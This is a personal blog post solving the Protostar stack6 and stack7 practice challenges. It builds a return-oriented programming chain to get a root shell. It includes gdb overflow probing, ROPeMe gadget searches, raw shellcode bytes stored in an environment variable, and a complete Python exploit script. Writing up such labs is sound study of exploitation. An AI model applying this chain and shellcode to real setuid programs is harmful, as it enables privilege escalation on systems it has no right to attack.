Title: Sort of ROP
Date: 2014-11-11 13:37
Category: Old Posts
Tags: old
Slug: Sort-of-ROP
Authors: wumb0

I've been running through some exploit challenges recently to try and develop my skills a bit more. I was working on the exploit-exercises.com <a href="https://exploit-exercises.com/protostar/" target="_blank">Protostar VM</a> on some stack challenges for a bit today and ended up doing some Return Oriented Programming (ROP) to solve <a href="https://exploit-exercises.com/protostar/stack6/" target="_blank">stack6</a> and <a href="https://exploit-exercises.com/protostar/stack7/" target="_blank">stack7</a>. It was interesting to work on so I thought that I would share here. I know it isn't 100% ROP (I use shellcode in the end) but that's alright, it got around the protections that these two challenges had in place.

Basically the gist of these two is that you can overflow a buffer of size 64 to get code execution. In these examples, however, there are some restrictions. In stack6 if you try and overwrite the return address with anything that begins with 0xbf (anything on the stack or in environmental vars), then it will exit and not run the shellcode you want it to. Unfortunate, but a nice challenge. Stack7 is similar but you cannot make the return address anything that starts with 0xb at all so it is a bit more restrictive. I was actually able to solve both at the same time with ROP. 
[[more]]

First, I needed to make sure I could overwrite the return address. This is fairly simple in this case because I have the source code and know the size of the buffer (64). I generated some input with python to test and debugged with gdb to make sure my code was segfauting because of a specific sequence of characters. I usually fill the buffer up to just before the return address with A's and then tack on BCDEFGHI so I can get a feeling of how many A's I need to add/take away to have control over the return address. I usually start with the size of the buffer plus 20 and judge based on that if i need to add/subtract A's. If eip is filled with A's then I have gone too far. If eip is filled with not A's or any of BCDEFGHI then I need to go further. If eip is filled with A's and any of BCD or any of GHI and random stuff then I am close. If eip has any combination of BCDEFGHI then I have found the padding necessary to overwrite the return address.

<pre><code>
~/ $ python -c 'print "A"\*84 + "\x41\x42\x43\x44\x45\x46\x47\x48\x49"' > six
... in another term
/opt/protostar/bin $ gdb -q ./stack6
(gdb) r < ~/six
Starting program: /opt/protostar/bin/stack6 < ~/six
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEFGHI

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
</code></pre>

Too far...

<pre><code>
~/ $ python -c 'print "A"\*80 + "\x41\x42\x43\x44\x45\x46\x47\x48\x49"' > six
... in another term
/opt/protostar/bin $ gdb -q ./stack6
(gdb) r < ~/six
Starting program: /opt/protostar/bin/stack6 < ~/six
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEFGHI

Program received signal SIGSEGV, Segmentation fault.
0x44434241 in ?? ()
</code></pre>

Got it. So the magic number is 80 A's and then the return address (44 is E, 43 is D, etc). I'll save this for later.

Next, I needed to find what gadgets I could use to start building my chain. I thought of using <a href="http://shell-storm.org/project/ROPgadget/" target="_blank">ROPGadget</a> from <a href="http://shell-storm.org/" target="_blank">shell-storm</a>, but the Protostar VM only had Python 2.6 and did not play nice with Capstone (disassembly framework). The alternative that I found and ended up using was <a href="http://ropshell.com/ropeme/" target="_blank">ROPeMe</a>. I had never used this tool before, only ROPGadget, but it is just as helpful and has a nice search feature so you can quickly find certain gadgets to build your chain with. 

I started searching for ways to execute my shellcode...
<pre><code>
user@protostar:~$ ./ropeme-bhus10/ropeme/ropshell.py
Simple ROP interactive shell: [generate, load, search] gadgets
ROPeMe> generate /opt/protostar/bin/stack6
Generating gadgets for /opt/protostar/bin/stack6 with backward depth=3
It may take few minutes depends on the depth and file size...
Processing code block 1/1
Generated 56 gadgets
Dumping asm gadgets to file: stack6.ggt ...
OK
ROPeMe> search call eax %
Searching for ROP gadget:  call eax % with constraints: []
0x804847fL: call eax ; leave ;;
</code></pre>

Great, so we have a way to execute code via eax. Now we need to get data into eax. This can be done many different ways. The most straightforward way is to just pop from the stack into eax and then run the call instruction. So I tried to find that.

<pre><code>
ROPeMe> search pop eax %
Searching for ROP gadget:  pop eax % with constraints: []
0x804835cL: pop eax ; pop ebx ; leave ;;
</code></pre>

Unfortunately, there is a leave instruction at the end of this gadget, which will destroy the rest of my stack unless I do some manipulation. As a side note: it is okay that there is a leave in my call eax gadget because it will never actually get run because we are calling eax with our stack/registers all set up already so we do not need to worry about it. Another way that we can get data into eax as by using xchg. So a quick search for that...

<pre><code>
ROPeMe> search xchg %
Searching for ROP gadget:  xchg % with constraints: []
0x804844bL: xchg edi eax ; add al 0x8 ; add [ebx+0x5d5b04c4] eax ;;
</code></pre>

Score! Only one result and just the one we needed. A few things to worry about here, though. The lower part of eax (al) has 8 added to it and eax is added to whatever is in memory at ebx+0x5d5b04c4. So really we just need to make sure our shellcode has enough nops to account for the 8 added on to the calling register (eax), that's the easy part, though. The harder (but still fairly easy) part is to make sure ebx+0x5d5b04c4 is a valid memory location so we can modify it. If it isn't valid or we cannot modify it then the program will crash. To fix this I used gdb to pick a spot on the stack where the initial padding to overflow the buffer was placed. In this case A was used to fill the buffer up and overrun to just before the return address. 

<pre><code>
~/ $ python -c 'print "A"\*80 + "\x41\x42\x43\x44"' > six
...in another term
/opt/protostar/bin $ gdb -q ./stack6
(gdb) r < ~/six
Starting program: /opt/protostar/bin/stack6 < ~/six
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEFGHI

Program received signal SIGSEGV, Segmentation fault.
0x44434241 in ?? ()
(gdb) x/16xw $esp-40
0xbffff648:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff658:     0x41414141      0x44434241      0x41414141      0x41414141
0xbffff668:     0x41414141      0x44434241      0x48474645      0x00000049
0xbffff678:     0xbffff6f8      0xb7eadc76      0x00000001      0xbffff724
</code></pre>

Okay so it is probably safe to add to one of the addresses near the top of this print out, lets just say 0xbffff648. So now we can use gdb to subtract the two numbers.

<pre><code>
(gdb) p/x 0xbffff648 - 0x5d5b04c4
$1 = 0x62a4f184
</code></pre>

Score, so now we need a way to pop 0x62a4f184 into ebx before the xchg gadget. Back to ROPeMe.

<pre><code>
ROPeMe> search pop ebx %
Searching for ROP gadget:  pop ebx % with constraints: []
0x804835dL: pop ebx ; leave ;;
0x80485c5L: pop ebx ; leave ;;
0x8048452L: pop ebx ; pop ebp ;;
0x80485a7L: pop ebx ; pop ebp ;;
</code></pre>

A few options here, but I'll take one of the ones without a leave because those seem to mess things up. The pop ebp doesn't matter because we are worried about the top of the stack, not the bottom. 0x8048452 looks good. So now that we have solved the two problems with the xchg gadget, we can move on to actually getting data into eax. To do this, we need to get data into edi because that is what xchg is going to put into eax. ROPeMe again!

<pre><code>
ROPeMe> search pop edi %
Searching for ROP gadget:  pop edi % with constraints: []
0x8048577L: pop edi ; pop ebp ;;
</code></pre>

Nice. That gadget will work just fine. Another pop ebp but again that is no big deal as shown later in the actual exploit code. 

So here is what we have so far:
<ul>
<li>4 gadgets:</li>
<ol>
    <li>0x8048452L: pop ebx ; pop ebp ;;</li>
    <li>0x804847fL: call eax ; leave ;;</li>
    <li>0x804844bL: xchg edi eax ; add al 0x8 ; add [ebx+0x5d5b04c4] eax ;;</li>
    <li>0x8048577L: pop edi ; pop ebp ;;</li>
</ol>
<li>Control of EIP</li>
<li>An address to feed into ebx to make sure our xchg gadget doesn't crash @ 0x62a4f184</li>
</ul>

There's only one more thing we need: Shellcode! Something eax can point to that actually does something. In this case we will launch a shell because these are all setuid binaries. Originally when I had completed this I ran into problems: my shell at /bin/sh or /bin/dash would immediately exit. I found a little trick on the <a href="https://isisblogs.poly.edu/2011/10/21/geras-insecure-programming-warming-up-stack-1-rop-nxaslr-bypass/" target="_blank">isispoly blog</a> that helped me work around my issues. Instead of launching /bin/sh I modified my shellcode so that it launched /tmp/sh, so I could define the executable. The code from the isispoly blog is below: 
<pre><code class="lang:bash" >
\#!/bin/bash
term="/dev/$(ps -p$$ --no-heading | awk '{print $2'})"
exec sh < $term
</code></pre>

What this does is gets the current tty and launches a shell with it. Good. So now we can take our shellcode and put it somewhere. I needed to make sure that /tmp/sh was chmodded a+x first, though, so it would actually execute when I finished. 

The next issue is where to put our shellcode. We could store it in the buffer of the program but that is usually unreliable. I like to use environmental variables to hold my shellcode. Finding out the address of an environmental variable is easy with the following C program:

<pre><code class="lang:c">
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
int main(int argc, char **argv){
    if (argc > 1)
        printf("%s: %x\\n", argv[1], getenv[argv[1]]);
    return 0;
}
</code></pre>

This will take the name an environmental variable as an argument and print out its address in memory. I usually compile this and put it in /bin so I can use it later as well. Nifty. So now we put our shellcode (and lots of NOPs) in an environmental variable and find its address. 

<pre><code>
/opt/protostar/bin $ export WIN=python -c 'print "\x90" * 200 + "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x74\x6d\x70\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'
/opt/protostar/bin $ getenv WIN
WIN: 0xbfffffa7
</code></pre>

Nice. So now I have everything I need to make this ROP chain:
<ul>
<li>4 gadgets:</li>
<ol>
    <li>0x8048452L: pop ebx ; pop ebp ;;</li>
    <li>0x804847fL: call eax ; leave ;;</li>
    <li>0x804844bL: xchg edi eax ; add al 0x8 ; add [ebx+0x5d5b04c4] eax ;;</li>
    <li>0x8048577L: pop edi ; pop ebp ;;</li>
</ol>
<li>Control of EIP</li>
<li>An address to feed into ebx to make sure our xchg gadget doesn't crash @ 0x62a4f184</li>
<li>Shellcode @ 0xbfffffa7</li>
</ul>


Now I spin up vim and go to work on a python script:

<pre><code class="python">
from struct import pack
CALLEAX = pack("&lt;I", 0x804847f) #call eax ; leave ;;
XEAX = pack("&lt;I", 0x804844b) #xchg edi eax ; add al 0x8 ; add [ebx+0x5d5b04c4] eax ;;
POPEDI = pack("&lt;I", 0x8048577) #pop edi ; pop ebp ;;
POPEBX = pack("&lt;I", 0x8048452) #pop ebx ; pop ebp ;;
SHLCD = pack("&lt;I", 0xbfffffa7+50-8) #shellcode address +50 so we land in the NOPS and -8 because we added 8 before with the xchg gadget, doesn't matter that much but it's good habit to get into
PAD = "BBBB"


buf = "A" * 80 #overflow the buffer to just before the return address
buf += POPEDI #POP the address of the shellcode into EDI
buf += SHLCD #This is after because now it will be first on the stack when POPEDI is called
buf += PAD #fill in ebp with padding
buf += POPEBX #POP the safe address into ebx so it doesn't crash
buf += pack("&lt;I", 0x62a4f184)
buf += PAD #plus padding for ebp
buf += XEAX #run the xchg to put the address of our shellcode into eax
buf += CALLEAX #call eax

print(buf) #profit
</code></pre>

Following this we output to a file and run the exploit:

<pre><code>
~/ $ python 2chainz.py > chain
~/ $ /opt/protostar/stack6 < chain
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBB��bBBBB���
# id
uid=0(root) gid=0(root) groups=0(root),1001(user)
</code></pre>

Sweet victory. 

From here solving stack7 is as easy as finding the new addresses of these gadgets with ROPeMe. The program is nearly identical to stack6 except for the fact that the return address is more restricted (can't start with 0xb). This was never an issue in the first place, though because we set the return address to 0x8048577 which is in the .text section anyway.
